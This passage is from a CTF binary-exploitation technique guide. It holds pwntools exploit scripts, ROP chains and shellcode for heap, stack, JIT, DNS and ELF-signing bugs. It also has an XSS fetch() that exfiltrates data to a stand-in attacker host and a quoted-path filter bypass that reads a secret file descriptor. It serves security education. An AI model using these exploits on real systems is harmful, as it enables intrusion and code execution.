1. Trigger controlled recursion (e.g., `do_reset()` → `play()` loop) to increment `shadow_stack_ptr` exactly 512 times
2. After 512 iterations, `shadow_stack_ptr` points to `username` (user-controlled buffer)
3. Write the `win()` address into `username` via normal input
4. Overflow the stack buffer to overwrite the hardware return address with `win()`
5. On return, both shadow stack and hardware stack contain `win()` — validation passes

**Exploit code (pwntools):**
```python
from pwn import *

exe = ELF('./revenant')
io = process('./revenant')

# Calculate iterations needed to overflow shadow_stack_ptr to username
shadow_stack_addr = exe.symbols["shadow_stack"]
username_addr = exe.symbols["username"]
iterations = (username_addr - shadow_stack_addr) // 8  # 512

# Step 1: Write win() address into username buffer
name = fit(exe.symbols["win"])

# Step 2: Recurse 512 times to advance shadow_stack_ptr to username
for i in range(iterations):
    io.sendlineafter(b"Survivor name:\n", name)
    io.sendlineafter(b"[0] Flee", b"4")  # Trigger do_reset() -> play()

# Step 3: Overflow stack buffer with win() address
padding = 56  # offset to return address (32-byte buf + 24 bytes)
payload = fit({padding: exe.symbols["win"]})
io.sendlineafter(b"(0-255):\n", payload)

io.interactive()
```

**Key insight:** Userland shadow stack implementations that lack bounds checking on the stack pointer are vulnerable to pointer overflow. By recursing enough times, the validation pointer advances past the shadow stack array into adjacent user-controlled memory (e.g., a username buffer). Writing the desired return address there makes the shadow stack check pass, defeating the protection entirely. The required iteration count is `(target_addr - shadow_stack_base) / pointer_size`.

**Detection pattern:** Look for:
- `.bss` arrays used as shadow stacks (paired push/pop with function calls)
- Missing bounds check on the index variable
- User-writable `.bss` variables adjacent to (above) the shadow stack array
- Recursive function calls controllable from user input

---

## Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge (Midnight 2026)

**Pattern (Canvas of Fear):** Web application wraps a native binary (`canvas_manager`) behind a Flask API, with admin endpoints restricted to `127.0.0.1`. The binary manages "canvases" (heap-allocated pixel arrays) with a pixel SET command that computes a 2D index as `y * width + x` using a **signed 32-bit int**. Supplying large `y` values overflows the multiplication to a negative result, passing the bounds check (`index < width * height`) while accessing memory **before** the data buffer — a negative OOB heap write primitive.

**Three-layer exploit chain:**
1. **Stored XSS** (Flask `|safe` Jinja filter) → admin bot executes JS at `127.0.0.1`
2. **XSS payloads call admin API** (Fetch API) → triggers binary commands
3. **Integer overflow → heap corruption → libc/stack leak → ROP chain**

### Heap Primitive: Signed Int Overflow in Index Calculation

The pixel index formula `y * width + x` wraps in 32-bit signed arithmetic:
```python
# For a 50x50 canvas: (8589934591 * 50 + 42) as int32 = -8
# After ×3 for RGB byte offset: -24 bytes before the data buffer
# This overwrites the canvas struct's height field (preceding the data on heap)
cmd(b'SET 1 42 8589934591 0x340000')  # overwrite height: 0x32 → 0x34
```

**Key insight:** The bounds check `index < width * height` uses signed comparison, so a negative overflow result always passes. This turns a single pixel SET into a backward OOB write into heap metadata or adjacent chunk headers.

### Full Exploitation Chain

```python
from pwn import *

# Step 1: Create canvases — canvas 3 acts as consolidation blocker
cmd(b'CREATE 1 50 50')   # large canvas (target for OOB write)
cmd(b'CREATE 2 20 20')   # victim (will be freed for unsorted bin leak)
cmd(b'CREATE 3 20 20')   # pivot (data pointer will be overwritten)

# Step 2: Free canvas 2 → unsorted bin puts libc pointers on heap
cmd(b'DELETE 2')

# Step 3: Overflow canvas 1's height field (0x32 → 0x34)
cmd(b'SET 1 42 8589934591 0x340000')

# Step 4: Read canvas 1 (now oversized) to leak heap + libc from freed chunk
cmd(b'GET 1')
# Parse RGB output: skip to offset 2507, extract fd/bk pointers
# heap_base = unpack(data[2:10]) << 12
# libc.address = unpack(data[34:42]) - 0x1edcc0

# Step 5: Remove size limit for full OOB write
cmd(b'SET 1 42 8589934591 0xffffff')

# Step 6: Overwrite canvas 3's data pointer → libc.sym['environ']
# Offset 0x2250 bytes from canvas 1's data to canvas 3's pointer field
target = unpack(pack(libc.sym["environ"]), endianness='big')
cmd(f'SET 1 2928 0 {hex((target >> 40) & 0xffffff)}'.encode())
cmd(f'SET 1 2929 0 {hex((target >> 16) & 0xffffff)}'.encode())

# Step 7: Read canvas 3 → reads *environ → stack leak
cmd(b'GET 3')
# main_ret = stack_leak - 0x140

# Step 8: Redirect canvas 3 pointer → main's return address on stack
target = unpack(pack(main_ret), endianness='big')
cmd(f'SET 1 2928 0 {hex((target >> 40) & 0xffffff)}'.encode())
cmd(f'SET 1 2929 0 {hex((target >> 16) & 0xffffff)}'.encode())

# Step 9: Write ROP chain via canvas 3 (3 bytes per pixel = per SET)
pop_rdi = libc.address + 0x2d7a2
ret = libc.address + 0x2c495
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat({0: [pop_rdi, binsh, ret, libc.sym["system"]]})
for i in range(0, len(payload), 3):
    block = unpack(payload[i:i+3][::-1].ljust(8, b'\x00')) & 0xffffff
    cmd(f'SET 3 {i//3} 0 0x{block:06x}'.encode())

# Step 10: EXIT triggers main() return → ROP chain executes
cmd(b'EXIT')
```

### XSS-to-Binary Pwn Bridge

When the binary is behind a web API with admin-only endpoints:

1. **Stored XSS via Flask `|safe`:** User messages rendered with `{{ msg.content | safe }}` bypass Jinja autoescaping. Submit `<script type="module">...</script>` via the public message endpoint
2. **Admin bot visits `/admin/messages`** from `127.0.0.1` → XSS executes
3. **Multi-stage payloads:** Each XSS stage calls admin API endpoints via `fetch()`, exfiltrates leaks to attacker VPS, then the next stage uses computed addresses:
   ```javascript
   // Stage 1: trigger heap commands, exfiltrate leak
   var res = await fetch("/api/canvas/get/1");
   var data = await res.json();
   await fetch('http://attacker:5000/', {
       method: 'POST', mode: 'no-cors',
       body: JSON.stringify({"pixels": btoa(JSON.stringify(data.pixels))})
   });
   ```
4. **Newline injection for command stacking:** The API uses `pwntools.sendline()` to forward user input to the binary. Injecting `\n` in a parameter (e.g., `"color": "#000000\nEXIT\n"`) executes multiple binary commands in one request, bypassing the API's EXIT-then-restart logic:
   ```javascript
   // Inject EXIT without triggering restart, then run shell commands
   body: JSON.stringify({"id": 9, "x": 0, "y": 0, "color": "#000000\nEXIT"})
   // Subsequent requests inject shell commands:
   body: JSON.stringify({"id": 9, "x": 0, "y": 0, "color": "#000000\n./read_flag"})
   ```

**Key insight:** The 3-byte RGB pixel value maps naturally to a 24-bit arbitrary write primitive — each SET writes 3 bytes at a controlled offset. Overwriting a canvas's data pointer (via OOB from another canvas) transforms pixel read/write into full arbitrary read/write. The `environ` → stack leak → ROP chain pipeline converts this into RCE. When the binary sits behind a web API, XSS bridges the network boundary and newline injection through `sendline()` enables command stacking.

**Detection pattern:**
- Index computation using signed int multiplication on user-controlled values
- Bounds check using signed comparison (negative values always pass)
- Adjacent heap allocations where metadata/pointers follow data buffers
- Web API that passes user input directly to `process.sendline()` without newline sanitization
- Flask templates with `|safe` filter on user-controlled content


# advanced-exploits-3

# CTF Pwn - Advanced Exploit Techniques (Part 3)

## Table of Contents
- [Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)](#stack-variable-overlap--carry-corruption-oob-srdnlenctf-2026)
- [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)
- [Game AI Arithmetic Mean OOB Read (BSidesSF 2024)](#game-ai-arithmetic-mean-oob-read-bsidessf-2024)
- [Arbitrary Read/Write to Shell via GOT Overwrite (BSidesSF 2026)](#arbitrary-readwrite-to-shell-via-got-overwrite-bsidessf-2026)
- [Stack Leak via __environ and memcpy Overflow (BSidesSF 2026)](#stack-leak-via-__environ-and-memcpy-overflow-bsidessf-2026)
- [JIT Sandbox Escape via Conditional Jump uint16 Truncation (BSidesSF 2026)](#jit-sandbox-escape-via-conditional-jump-uint16-truncation-bsidessf-2026)
- [DNS Compression Pointer Stack Overflow with Multi-Question ROP (BSidesSF 2026)](#dns-compression-pointer-stack-overflow-with-multi-question-rop-bsidessf-2026)
- [ELF Code Signing Bypass via Program Header Manipulation (BSidesSF 2026)](#elf-code-signing-bypass-via-program-header-manipulation-bsidessf-2026)
- [Game Level Format Signed/Unsigned Coordinate Mismatch (BSidesSF 2026)](#game-level-format-signedunsigned-coordinate-mismatch-bsidessf-2026)
- [File Descriptor Inheritance via Missing O_CLOEXEC (BSidesSF 2026)](#file-descriptor-inheritance-via-missing-o_cloexec-bsidessf-2026)
- [Sign Extension Integer Underflow in Metadata Parsing (BSidesSF 2026)](#sign-extension-integer-underflow-in-metadata-parsing-bsidessf-2026)
- [ROP Chain Construction with Read-Only Primitive (BSidesSF 2026)](#rop-chain-construction-with-read-only-primitive-bsidessf-2026)
- [4-Byte Shellcode with Timing Side-Channel via Persistent Registers (Google CTF 2017)](#4-byte-shellcode-with-timing-side-channel-via-persistent-registers-google-ctf-2017)
- [CRC Oracle as Arbitrary Read Primitive (ASIS CTF 2017)](#crc-oracle-as-arbitrary-read-primitive-asis-ctf-2017)
- [UTF-8 Case Conversion Buffer Overflow (HITB CTF 2017)](#utf-8-case-conversion-buffer-overflow-hitb-ctf-2017)

---

## Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)

**Pattern (common_offset):** Stack variables share storage due to compiler layout. Carry from arithmetic on one variable corrupts an adjacent variable, enabling OOB access.

**Vulnerability:** `index` (byte at `[rsp+0x49]`) and `offset` (word at `[rsp+0x48]`) share storage. Incrementing `offset` by 255 causes a carry that corrupts `index` from 3 to 4, producing out-of-bounds table access.

**Exploit chain:**
1. Set index=0, increment offset by 1 to establish baseline
2. Set index=3, increment offset by 255 → carry corrupts index to 4
3. OOB access on table retrieves saved RIP from stack frame
4. Overwrite RIP to trigger `read_stdin` again, landing on stack gadget
5. Two-stage ROP: leak `puts@GOT`, compute libc base, then `setcontext` for code execution

**Key insight:** When variables of different sizes are packed adjacent on the stack (e.g., byte immediately after word), arithmetic overflow on the smaller-address variable carries into the larger-address variable. This is subtle in disassembly — look for overlapping `[rsp+N]` accesses with different operand sizes.

**Detection:** In disassembly, check if two named variables share partially overlapping stack offsets. For example, a `word` at `rsp+0x48` and a `byte` at `rsp+0x49` — the high byte of the word IS the byte variable.

---

## 1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)

**Pattern (Echo):** Custom `read_stdin()` uses 8-bit loop counter that wraps around, writing 65 bytes to a 64-byte buffer, overflowing into an adjacent size variable.

**Progressive leak technique:**
1. Trigger 1-byte overflow to increase buffer size from 0x40 to 0x48
2. With enlarged buffer, read further on stack — leak canary and saved rbp
3. Increase size to 0x77 to leak main's libc return address from stack
4. Compute libc base from leaked return address offset
5. Craft final payload: restore canary, set fake rbp, overwrite RIP with one-gadget

**One-gadget constraint setup:**
```python
from pwn import *

# Stack layout: buffer[rbp-0x50], size[rbp-0x10], canary[rbp-0x08], rbp, ret
# One-gadget needs NULL at [rbp-0x78] and [rbp-0x60]
buf_addr = leaked_rbp - 0x50  # known from leak
fake_rbp = buf_addr + 0x78

payload = b"\x00" * 8          # [fake_rbp - 0x78] = NULL (constraint)
payload += b"A" * 16
payload += b"\x00" * 8          # [fake_rbp - 0x60] = NULL (constraint)
payload = payload.ljust(64, b"A")
payload += p64(0x48)            # preserve enlarged size
payload += p64(canary)          # restore canary
payload += p64(fake_rbp)        # fake rbp satisfying constraints
payload += p64(one_gadget)      # libc one-gadget
```

**Key insight:** 8-bit counters in read loops cause off-by-one when the buffer size equals the counter's range (64 → wraps after 64, writes byte 65). The 1-byte overflow into a size field creates a progressive information disclosure primitive: each round leaks more stack data, enabling a full exploit chain from a single-byte overflow.

---

---

## Game AI Arithmetic Mean OOB Read (BSidesSF 2024)

When a game computes AI moves as the arithmetic mean of player input and previous state, submitting out-of-bounds coordinates produces a controlled OOB access:

```c
// AI "Smartypants" strategy: average of human and last computer move
ai_move.row = (human_move.row + last_computer.row) / 2;
ai_move.col = (human_move.col + last_computer.col) / 2;
// Bounds validation happens AFTER ai_move is computed and used
```

Submit extreme values (e.g., row=100000, col=100000) to make the AI compute `(100000 + 0) / 2 = 50001`, which reads well past the game board allocation into stack/heap memory.

```python
from pwn import *

# Brute-force memory offset to find flag
for offset in range(-6000, 6000, 100):
    r = remote(host, port)
    r.sendline(str(offset * 2).encode())  # Row (doubled because AI halves)
    r.sendline(b'0')                       # Col
    response = r.recvall()
    if b'CTF{' in response:
        print(f"Flag at offset {offset}: {response}")
        break
    r.close()
```

**Key insight:** Input validation that occurs after variable assignment creates a TOCTOU gap. Even if the game rejects the move, the computed AI position may have already been used to access memory. The arithmetic mean serves as a divide-by-2 primitive — submit 2x the desired OOB offset as player input.

---

---

## Arbitrary Read/Write to Shell via GOT Overwrite (BSidesSF 2026)

**Pattern (readwriteme):** Binary provides explicit arbitrary read and arbitrary write primitives (e.g., "read address" and "write address" menu options). No need for complex heap or format string exploits — just use the primitives directly.

**Exploit chain:**
1. **Leak libc:** Read a GOT entry (e.g., `strtoll@GOT`) to get a libc address
2. **Calculate `system`:** Compute `system` address from known libc offset
3. **Overwrite GOT:** Write `system` address to `strtoll@GOT`
4. **Trigger shell:** Next time the binary calls `strtoll(user_input)`, it executes `system(user_input)` instead — send `sh\n`

```python
from pwn import *

elf = ELF('./readwriteme')
libc = ELF('./libc.so.6')
p = remote('target', port)

# Step 1: Leak strtoll@GOT
p.sendlineafter(b'> ', b'read')
p.sendlineafter(b'address: ', hex(elf.got['strtoll']).encode())
strtoll_addr = int(p.recvline().strip(), 16)
libc_base = strtoll_addr - libc.sym['strtoll']

# Step 2: Overwrite strtoll@GOT with system
p.sendlineafter(b'> ', b'write')
p.sendlineafter(b'address: ', hex(elf.got['strtoll']).encode())
p.sendlineafter(b'value: ', hex(libc_base + libc.sym['system']).encode())

# Step 3: Next input parsed by strtoll() → system()
p.sendlineafter(b'> ', b'sh')
p.interactive()
```

**Why `strtoll` → `system`:** Both take a `const char *` as first argument. When the binary calls `strtoll(user_input, ...)`, the GOT redirect makes it call `system(user_input)` — the extra arguments are harmlessly ignored.

**Key insight:** When a binary gives you arbitrary read + write, the fastest path to shell is GOT overwrite. Choose a GOT entry for a function that (a) takes a user-controlled string as its first argument, and (b) is called after you perform the overwrite. `strtoll`, `atoi`, `puts`, and `printf` are all good candidates depending on the binary's flow.

**References:** BSidesSF 2026 "readwriteme"

---

## Stack Leak via __environ and memcpy Overflow (BSidesSF 2026)

**Pattern (readme):** Binary provides an arbitrary read primitive (e.g., `memcpy(stack_buf, user_addr, user_len)`) but NO write primitive. The `memcpy` overflow itself becomes the write primitive.

**Exploit chain:**
1. **Leak libc:** Use the read primitive on a GOT entry to get a libc address
2. **Leak stack:** Read `__environ` from libc (contains a stack pointer to the environment variables)
3. **Calculate return address location:** From the stack leak, compute where the current function's return address is stored
4. **Plant ROP payload:** Embed `p64(ret_gadget) + p64(target_func)` inside the command input buffer (the same buffer that `fgets` reads into)
5. **memcpy overflow:** Use the `memcpy(stack_buf, controlled_addr, large_len)` to copy your planted payload over the return address
6. **Trigger return:** Send EOF to close stdin, causing `fgets` to return NULL and the function to exit through the overwritten return address

```python
from pwn import *

elf = ELF('./readme')
libc = ELF('./libc.so.6')
p = remote('target', port)

# Step 1: Leak libc via GOT read
p.sendlineafter(b'> ', f'read {hex(elf.got["puts"])}'.encode())
puts_addr = u64(p.recv(8))
libc_base = puts_addr - libc.sym['puts']

# Step 2: Leak stack via __environ
environ_addr = libc_base + libc.sym['__environ']
p.sendlineafter(b'> ', f'read {hex(environ_addr)}'.encode())
stack_addr = u64(p.recv(8))
# Return address is at known offset from __environ
ret_addr_location = stack_addr - OFFSET_TO_RET  # Determine via debugging

# Step 3: Plant ROP addresses in the input buffer
# The command buffer is also on the stack at a known offset
ret_gadget = libc_base + GADGET_OFFSET
win_func = elf.sym['win']  # or one_gadget
payload = p64(ret_gadget) + p64(win_func)

# Step 4: memcpy overflow to copy planted payload over return address
# memcpy(dest=stack_buf, src=our_planted_addr, len=enough_to_reach_ret)
p.sendlineafter(b'> ', f'read {hex(planted_addr)} {overflow_len}'.encode())

# Step 5: EOF triggers return through overwritten address
p.shutdown('send')
p.interactive()
```

**Why `__environ`:** The global variable `__environ` in libc always points to the process's environment variable array on the stack. Since it's at a fixed libc offset, leaking libc gives you `__environ`, which gives you a stack address. From there, the offset to any stack frame's return address is deterministic (found via debugging).

**Key insight:** When you have only a read primitive, look for ways the read itself can be abused as a write. `memcpy` with user-controlled length overflows the destination buffer, turning a read into a write. The `__environ` → stack leak → return address chain is a standard technique when you need to find the stack without an info leak from the binary itself.

**References:** BSidesSF 2026 "readme"

---

---

## JIT Sandbox Escape via Conditional Jump uint16 Truncation (BSidesSF 2026)

**Pattern (rugdoctor):** A "secure JIT sandbox" compiles a simple scripting language to x86-64 machine code in an RWX buffer. The `if` statement emits a `jz` with a 32-bit relative offset, but the offset calculation truncates to 16 bits: `(uint16_t)code_offset - (uint16_t)if_address - 4`. When the code exceeds 65535 bytes, the truncated offset causes the jump to land inside a future instruction's immediate value.

**Exploitation steps:**
1. Emit ~9370 `add` instructions inside an `if` block with condition `$b = 0` (always-false branch)
2. The truncated `jz` offset lands in the middle of an `add` instruction's 32-bit immediate value
3. The attacker controls the immediate values — embed 2-byte instruction fragments + `jmp $+3` (EB 03) to skip past JIT boilerplate bytes between each `add`
4. Thread a multi-stage shellcode: `mmap` RWX memory via syscall → copy full shellcode byte-by-byte → `call rbx`

```ruby
# Embed 2-byte instruction pairs in add immediates, interleaved with jmp $+3
shellcode_fragments = [
  "\x6a\x00",   # push 0     -> rdi = NULL (mmap addr)
  "\x5f\x90",   # pop rdi / nop
  "\x6a\x07",   # push 7     -> rdx = PROT_RWX
  "\x5a\x90",   # pop rdx / nop
  "\x0f\x05",   # syscall    -> mmap
]

# Each fragment becomes: fragment_bytes + \xEB\x03 (jmp $+3)
# Packed as 32-bit add immediate: fragment[0:2] + EB 03
adds = shellcode_fragments.map { |frag| "#{frag}\xeb\x03".unpack('V').pop }

# Write shellcode byte-by-byte via mov [rax], imm8 / jmp $+3
SHELLCODE.bytes.each do |byte|
  adds << "\xc6\x00#{byte.chr}\xeb".unpack('V').pop   # mov byte ptr [rax], byte
end
```

**Key insight:** The JIT compiler uses `uint16_t` for offset calculation even though the code buffer can exceed 64KB. The 16-bit truncation creates a "JIT spray" where the attacker controls instruction bytes at predictable positions within the RWX buffer. The `jmp $+3` threading technique chains 2-byte instruction fragments separated by 3 bytes of JIT overhead.

**When to recognize:** Challenge involves a JIT compiler or scripting engine that compiles to native code. Look for integer truncation in jump/branch offset calculations, RWX memory regions, and user-controlled immediate values in generated instructions.

**Broader pattern:** JIT spraying attacks embed shellcode fragments in instruction immediates (typically `add`, `xor`, or `mov` constants). The misalignment between intended and actual instruction boundaries turns data into executable code. Common in browser JIT engines and CTF sandbox challenges.

**References:** BSidesSF 2026 "rugdoctor"

---

## DNS Compression Pointer Stack Overflow with Multi-Question ROP (BSidesSF 2026)

**Pattern (nameme):** Custom DNS server has a stack buffer overflow in domain name parsing. DNS compression pointers (`0xC0 | offset`) allow jumping to arbitrary positions in the packet, and the parser does not track total decompressed length. Carefully crafted pointer chains revisit data multiple times, overflowing a 1024-byte stack buffer.

**DNS compression primer:**
- Domain names in DNS packets use label+length encoding: `\x03www\x06google\x03com\x00`
- Compression pointers: byte starting with `0xC0` means "jump to offset in packet" — `\xC0\x0D` jumps to byte 13
- Pointers can chain: A → B → C, potentially revisiting the same data

**Exploitation:**
1. Craft 8 DNS questions with carefully sized names
2. Use compression pointers (`\xC0\x0D`, `\xC0\x0E`) to chain between questions
3. Parser revisits data, expanding each compression hop, overflowing the 1024-byte `dns_question_t.name` buffer
4. ROP chain split across 3 question entries (14+14+13 gadgets) due to per-question size limits
5. ROP executes `sys_read` → `sys_open` → `sys_read` → `sys_write`; flag path sent as second UDP packet

```python
import struct, socket

def encode_question(name_bytes, qtype=1, qclass=1):
    return name_bytes + struct.pack('>HH', qtype, qclass)

# Overflow via compression pointer chains
questions = []
# Questions 1-4: fill buffer with controlled data
# Questions 5-8: use compression pointers to trigger re-expansion
# Final question: \xC0\x0D\x36AAAA...\xC0\x0E triggers overflow

# Build DNS packet: header (QDCOUNT=8) + questions
header = struct.pack('>HHHHHH', 0x1337, 0x0100, 8, 0, 0, 0)
packet = header + b''.join(questions)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(packet, (target, 53535))
# Send flag path in second packet after ROP calls sys_read
sock.sendto(b'/home/ctf/flag.txt\x00', (target, 53535))
```

**Key insight:** DNS compression was designed for efficiency but creates a decompression amplification vulnerability. If the parser doesn't track total output length, compression pointer chains can expand a small packet into an arbitrarily large decompressed name. The multi-question format allows splitting a large ROP chain across multiple entries while keeping each entry within DNS label size limits.

**When to recognize:** Challenge involves a custom DNS server (not BIND/dnsmasq). Look for domain name parsing functions with fixed-size output buffers and no length tracking during compression pointer resolution.

**References:** BSidesSF 2026 "nameme"

---

## ELF Code Signing Bypass via Program Header Manipulation (BSidesSF 2026)

**Pattern (selfsigned):** An ELF signing/verification system hashes only section headers and content of sections with the `SHF_ALLOC` flag. Program headers (which control what the loader actually maps) are not directly covered by the hash. By appending shellcode to the file and modifying program headers to load from the appended data, the signature remains valid.

**ELF structure gap:**
- **Section headers** (`.text`, `.data`, etc.): Used by linkers and RE tools; covered by the hash
- **Program headers** (`LOAD`, `INTERP`, etc.): Used by the OS loader to map memory; NOT covered by the hash
- The `e_phoff` field in the ELF file header (pointing to program header table) doesn't change if you modify entries in place

**Exploitation:**
1. Download the signed reference binary from the server
2. Page-align the binary length (pad to 4096-byte boundary)
3. Append shellcode at the padded offset, positioned so it maps to the original entrypoint virtual address
4. Modify the code segment's program header: change `p_offset` to point to the appended data, update `p_filesz`/`p_memsz`
5. Section headers remain unchanged → signature still verifies
6. Upload modified binary; server verifies signature (passes) and executes (runs shellcode)

```python
from elftools.elf.elffile import ELFFile
import struct

def fixup_binary(binary_path, shellcode):
    with open(binary_path, 'rb') as f:
        elf = ELFFile(f)
        data = bytearray(f.read())

    entry = elf.header.e_entry
    orig_len = len(data)

    # Pad to page boundary
    page_size = 0x1000
    padded_len = (orig_len + page_size - 1) & ~(page_size - 1)
    data.extend(b'\x00' * (padded_len - orig_len))

    # Write shellcode at offset matching entrypoint alignment
    sc_offset = padded_len
    data.extend(shellcode)

    # Find and modify the LOAD segment containing .text
    for seg in elf.iter_segments():
        if seg.header.p_type == 'PT_LOAD' and seg.header.p_flags & 0x1:  # PF_X
            # Rewrite this program header entry
            new_phdr = seg.header.copy()
            new_phdr['p_offset'] = sc_offset
            new_phdr['p_filesz'] = len(shellcode)
            new_phdr['p_vaddr'] = entry & ~(page_size - 1)
            # Write modified phdr back to its position in the file
            # ...

    return bytes(data)
```

**Key insight:** Many code signing implementations only hash section-level metadata (section headers + content), not program headers. Since the OS loader uses program headers (not section headers) to map code into memory, an attacker can redirect code loading to attacker-controlled data without invalidating the signature. This is a real-world design flaw found in some embedded and IoT code signing schemes.

**When to recognize:** Challenge involves ELF binary signing/verification. Check what the hash covers — if it only processes sections (especially `SHF_ALLOC` sections), program header manipulation bypasses it.

**Broader lesson:** Secure ELF signing must cover both section AND program headers, or better yet, hash the entire file. Section headers are optional at runtime — a valid ELF can execute with zero sections. Any signing scheme that relies solely on sections is bypassable.

**References:** BSidesSF 2026 "selfsigned"

---

## Game Level Format Signed/Unsigned Coordinate Mismatch (BSidesSF 2026)

**Pattern (blockman-builder):** A 2D platformer game uses a level editor that parses block placement instructions with signed integer coordinates. The bounds check compares signed values against unsigned dimensions (`if (x1 < level_width && y1 < WORLD_H)`) — when x1 is negative, the signed-to-unsigned comparison passes because a large unsigned value is less than the unsigned width. This allows writing arbitrary bytes (block IDs) to memory before the level array.

**Exploitation steps:**
1. Extract source code from binary (embedded in a custom ELF section, found via `strings`)
2. Enable developer mode (hidden konami-code input sequence) to leak level data stack address
3. Craft level with shellcode bytes encoded as block IDs placed at legitimate positive coordinates
4. Use negative coordinates to overwrite the return address on the stack, pointing to the shellcode in level data
5. Level data is base64+zlib encoded; use pack/unpack scripts

```python
import struct, zlib, base64

# Level format: "clear\n{width}\n{n_entities}\n{entities...}\n{n_blocks}\n{blocks...}"
shellcode = open("shellcode.bin", "rb").read()
leaked_addr = 0x7ffd3de47d70  # From developer mode leak
level_base = leaked_addr       # Level data is on the stack

# Place shellcode bytes as block IDs at positive coordinates
lines = ["clear", "128", "0", "0"]  # width=128, 0 entities, 0 initial blocks
block_lines = []

# Write shellcode to level array at known offset
for i, byte in enumerate(shellcode):
    x = i % 128
    y = i // 128
    block_lines.append(f"{byte},{x},{y}")

# Overwrite return address with negative Y coordinate
ret_offset = -(0x100)  # Offset from level array to saved RIP
# 6-number format: block_id, x1, y1, x2, y2 (rectangle fill)
for i, byte in enumerate(struct.pack("<Q", level_base)):
    block_lines.append(f"{byte},{i},{ret_offset}")

lines[3] = str(len(block_lines))
level_data = "\n".join(lines + block_lines)
encoded = base64.b64encode(zlib.compress(level_data.encode())).decode()
```

**Key insight:** Game level formats that accept coordinates as signed integers but use unsigned comparisons for bounds checking create a classic signed/unsigned confusion vulnerability. The negative coordinate underflows the array index, providing an arbitrary write primitive. Combined with a leaked stack address (from debug/developer features), this turns into reliable code execution.

**When to recognize:** Custom game/level editors with user-defined coordinates, tile-map formats, or any array-indexed data where coordinates are parsed as signed but compared as unsigned. Developer/debug modes that leak memory addresses are a strong hint.

**References:** BSidesSF 2026 "blockman-builder"

---

## File Descriptor Inheritance via Missing O_CLOEXEC (BSidesSF 2026)

**Pattern (inheritance):** A service reads a secret into a file descriptor created with `memfd_create("secret", 0)` (without `MFD_CLOEXEC`), then calls `system()` to execute user-supplied commands. The `system()` function spawns a child process via `fork()+exec()`, and the child inherits all open file descriptors that lack the `O_CLOEXEC` flag.

The service blocks certain strings ("proc", "fd", ">", "<") to prevent reading `/proc/self/fd/N`. Bypass using shell quote insertion: `cat /p'r'oc/self/f'd'/4` — the single quotes are transparent to bash but break C-level `strstr()` checks.

```python
from pwn import *

r = remote("target", 1337)

# Service prints "Loaded config into fd 4" or similar
r.recvuntil(b"fd ")
fd_num = int(r.recvline().strip())

# Bypass strstr() filter with shell quote breaking
# "proc" and "fd" are blocked, but p'r'oc and f'd' are not
payload = f"cat /p'r'oc/self/f'd'/{fd_num}"
r.sendline(payload.encode())
flag = r.recvall()
print(flag.decode())
```

**Key insight:** `memfd_create()` without `MFD_CLOEXEC` (or `open()` without `O_CLOEXEC`) leaves file descriptors inheritable across `fork()+exec()`. Any service that reads secrets into FDs and then spawns child processes is vulnerable. The `/proc/self/fd/N` path provides access to inherited descriptors. For filter bypass: shell quote splitting (`p'r'oc`) breaks substring matching in C but bash concatenates the fragments transparently.

**When to recognize:** Service reads a secret file, then lets you run commands (via `system()`, `popen()`, etc.). Check if the FD was opened with `O_CLOEXEC`. Look for string filters that block keywords — single-quote splitting, backslash escaping (`\p\r\o\c`), or variable expansion (`${PATH:0:1}`) can bypass `strstr()`.

**References:** BSidesSF 2026 "inheritance"

---

## Sign Extension Integer Underflow in Metadata Parsing (BSidesSF 2026)

**Pattern (if-it-leads):** A music metadata parser has a `to_int32` function that converts unsigned 32-bit values to signed: `n >= 0x80000000 ? n - 0x100000000 : n`. When applied to a size/offset field, a large unsigned value becomes a large negative signed integer, causing out-of-bounds memory access during processing. Byte-by-byte iteration reveals memory contents.

```python
from pwn import *
import re

flag = b""
for i in range(64):
    # Construct metadata with field value that causes OOB read at offset i
    target_val = 0x80000000 + i  # Becomes negative after to_int32
    payload = craft_metadata(target_val)

    r = process(["./parser", payload])
    output = r.recvall()

    # Extract leaked byte from hexdump or error output
    leaked = extract_byte(output)
    flag += bytes([leaked])
    if b"}" in flag:
        break

print(flag.decode())
```

**Key insight:** Custom `to_int32()` or manual sign extension functions are a red flag. The conversion `n >= 0x80000000 ? n - 0x100000000 : n` makes values in `[0x80000000, 0xFFFFFFFF]` negative, but subsequent code may use the result as an array index or memory offset without re-checking bounds. Incrementally varying the input value leaks memory one byte at a time.

**When to recognize:** Challenge involves file format parsing (media, archives, protocols) with custom integer conversion. Look for manual sign-extension patterns. The leak is incremental — each query reveals one byte, requiring many iterations.

**References:** BSidesSF 2026 "if-it-leads"

---

## ROP Chain Construction with Read-Only Primitive (BSidesSF 2026)

**Pattern (readme):** Binary provides only a `read()` primitive (no write, no secret function). Build a ROP chain by:
1. Use `read()` to probe the stack and find the buffer-to-return-address offset
2. Leak libc base from GOT entries
3. Scan libc's `.rodata` and `.text` sections for byte patterns that match needed ROP gadget addresses
4. Use `read(0, stack_addr, N)` to place gadget addresses on the stack by reading specific libc offsets that happen to contain the right bytes
5. Chain: `open("flag.txt") -> read(fd, buf, size) -> write(1, buf, size)`

```python
from pwn import *

elf = ELF('./readme')
libc = ELF('./libc.so.6')

r = remote("target", 1337)

# Step 1: Find offset — fill buffer with pattern, read back from stack
r.sendline(b"read " + p64(stack_addr))
leak = r.recvn(8)
offset = find_pattern_offset(leak)

# Step 2: Leak libc base
r.sendline(b"read " + p64(elf.got['read']))
libc_read = u64(r.recvn(8))
libc_base = libc_read - libc.symbols['read']

# Step 3: Build ORW ROP chain using libc gadgets
pop_rdi = libc_base + find_gadget(libc, "pop rdi; ret")
pop_rsi = libc_base + find_gadget(libc, "pop rsi; ret")
pop_rdx = libc_base + find_gadget(libc, "pop rdx; ret")

rop = flat([
    pop_rdi, 0,           # fd = stdin for read
    # ... read flag path onto stack, then open/read/write chain
])
```

**Key insight:** A read-only primitive is sufficient for full exploitation. The key realization: libc contains billions of byte patterns across `.text`, `.rodata`, `.data`, and `.bss` sections. By reading from specific libc offsets, you can "import" arbitrary byte values onto the stack. This eliminates the need for a write primitive — you write to the stack indirectly by reading from addresses whose content matches your desired payload.

